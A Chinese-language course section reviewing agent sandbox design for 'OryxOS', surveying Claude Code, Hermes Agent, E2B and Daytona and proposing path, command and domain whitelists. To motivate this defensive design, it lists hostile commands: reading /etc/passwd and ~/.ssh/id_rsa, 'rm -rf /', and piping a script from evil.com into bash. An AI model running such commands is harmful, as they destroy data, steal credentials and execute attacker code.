# 第23节：Sandbox 原理解析、业界方案与 OryxOS 设计评审

> **课时目标**：深入理解 Agent 沙箱安全的原理，调研业界主流方案（Claude Code、Hermes Agent、容器方案），完成 OryxOS Sandbox 模块的技术设计评审。

---

## 一、本节定位

本节是一篇**技术评审文档**，回答三个问题：

1. Sandbox 是什么、为什么 Agent 必须要有？
2. 业界是怎么做的？（Claude Code、Hermes Agent、E2B、Daytona）
3. OryxOS 应该怎么做？（技术选型 + 实现路径）

---

## 二、Sandbox 基本原理

### 2.1 问题定义

Agent 的核心能力是**调用工具**——读写文件、执行命令、发 HTTP 请求。但如果 Agent 可以：

- 读取 `/etc/passwd` 或 `~/.ssh/id_rsa`
- 执行 `rm -rf /` 或 `curl evil.com/backdoor.sh | bash`
- 向任意域名发送企业内部数据

那 Agent 就不是助手，而是**安全灾难**。Sandbox 的作用：
> **在 Agent 的工具调用路径上设置一道不可绕过的安全边界。**

### 2.2 安全隔离等级

```
Level 0: 无隔离           → 直接执行，无限制
Level 1: 应用层白名单      → 路径/命令/域名白名单校验 ← OryxOS 核心阶段
Level 2: 容器隔离          → Docker / containerd 容器
Level 3: 微虚拟机 (microVM) → Firecracker / gVisor
Level 4: 物理隔离          → 独立物理机 / 气隙网络
```

每一层的安全强度递增，但复杂度和资源开销也递增。

---

## 三、业界方案

### 3.1 Claude Code — 应用层沙箱

**定位**：Anthropic 的命令行 AI 编程工具。

**沙箱机制**：
- 文件操作限于项目目录
- Shell 命令需要用户审批（Ask 模式）
- 网络请求需授权
- 敏感操作（git push、npm publish）需二次确认

**启示**：应用层白名单是实用且有效的第一道防线。OryxOS 的 `WhitelistSandbox` 借鉴了这一思路。

### 3.2 Hermes Agent — 容器级沙箱

**定位**：Nous Research 的 Agent 框架，强调可审计和可控。

**GitHub**：https://github.com/nousresearch/hermes-agent

**沙箱机制**：
- 每个 Agent 运行在独立 Docker 容器中
- 文件系统隔离（容器内可见的文件是外部的一个子集）
- 网络策略（iptables 规则限制出站连接）
- 资源限制（CPU/内存上限）

**启示**：容器级隔离比应用层更安全，但启动开销大（秒级→十秒级），不适合高频短任务。

### 3.3 E2B Dev — 云端 Sandbox 即服务

**定位**：提供云端安全沙箱 API，Agent 代码在远端执行。

**特点**：
- 毫秒级启动（Firecracker microVM）
- 用完即销毁
- SDK 支持 Python/JavaScript

**局限**：数据要上传到云端，不适合 OryxOS 的"数据不出域"定位。

### 3.4 Daytona — 自托管开发环境管理

**定位**：开源的开发环境管理器，可部署在自己的基础设施。

**特点**：
- 支持 Docker / Kubernetes 后端
- REST API 管理环境生命周期
- 可用于 Agent 沙箱场景

**启示**：如果 OryxOS 未来需要容器级隔离，Daytona 的架构可以作为参考。

### 3.5 学界讨论

学术界对 Agent 安全的关键观点：

| 主题 | 共识 |
|------|------|
| 最小权限 | Agent 只应拥有完成任务所需的最小权限 |
| 防御深度 | 单层防护不够，需要多层（白名单 + 容器 + 审计） |
| 可审计性 | 每次危险操作都应有记录，事后可追溯 |
| 用户审批 | 高风险操作需要人类在环（human-in-the-loop） |

---

## 四、OryxOS Sandbox 技术方案

### 4.1 设计原则

1. **接口先行**：`Sandbox` 接口独立于实现，未来换重隔离方案不影响调用方
2. **分层演进**：核心阶段用应用层白名单，扩展阶段引入容器/microVM
3. **三类白名单**：文件路径、Shell 命令、HTTP 域名——各自独立管理
4. **持久化配置**：白名单存 SQLite，启动从配置播种，运行时动态管理

### 4.2 架构设计

```
┌─────────────────────────────────────────────┐
│              Sandbox 接口 (core)              │
│   enforce(ActionType type, String target)    │
├─────────────────────────────────────────────┤
│            WhitelistSandbox (tool)            │
│  ┌───────────┐ ┌──────────┐ ┌──────────┐   │
│  │ File      │ │ Shell    │ │ HTTP     │   │
│  │ Whitelist │ │ Whitelist│ │ Whitelist│   │
│  │ (路径前缀)│ │ (命令名) │ │ (域名)   │   │
│  └───────────┘ └──────────┘ └──────────┘   │
│                    │                         │
│            ┌───────▼────────┐                │
│            │   SQLite 存储   │                │
│            │ sandbox_rules  │                │
│            └────────────────┘                │
├─────────────────────────────────────────────┤
│  扩展阶段                                    │
│  ┌──────────┐  ┌──────────┐                 │
│  │ Docker   │  │Firecracker│                │
│  │ Sandbox  │  │ Sandbox  │                 │
│  └──────────┘  └──────────┘                 │
└─────────────────────────────────────────────┘
```

### 4.3 HTTP 分级策略

| 请求类型 | 策略 | 说明 |
|----------|------|------|
| GET | **默认放行** + 黑名单（内网/回环/云元数据） | 信息获取为主，风险可控 |
| POST / PUT / DELETE | **域名白名单** | 写操作需显式授权 |

### 4.4 白名单动态管理

管理员可通过 API 或管理台动态增删白名单条目：

```bash
# 添加白名单
curl -X POST http://localhost:8080/api/v1/sandbox/rules \
  -d '{"type":"FILE","value":"/data/reports"}'

# 查询白名单
curl http://localhost:8080/api/v1/sandbox/rules?type=FILE

# 删除白名单
curl -X DELETE http://localhost:8080/api/v1/sandbox/rules/{id}
```

### 4.5 错误处理

白名单拒绝时，返回明确的错误信息：

```json
{
  "code": 403,
  "message": "Sandbox violation: SHELL_COMMAND action denied for target 'curl'",
  "data": {
    "type": "SHELL_COMMAND",
    "target": "curl",
    "suggestion": "请在管理台「SandBox 列表」中添加白名单"
  }
}
```

标注 `retryable: false`，避免 Agent 无限重试。

---

## 五、与课程的关系

```
第23节（本节）→ 技术评审：调研 → 对比 → 决策
第24节        → 实现：WhitelistSandbox + 动态管理 + 管理台
```

---

## 六、参考资料

- Claude Code Security：https://docs.anthropic.com/en/docs/claude-code/security
- Hermes Agent：https://github.com/nousresearch/hermes-agent
- E2B：https://e2b.dev
- Daytona：https://www.daytona.io
- Firecracker：https://firecracker-microvm.github.io
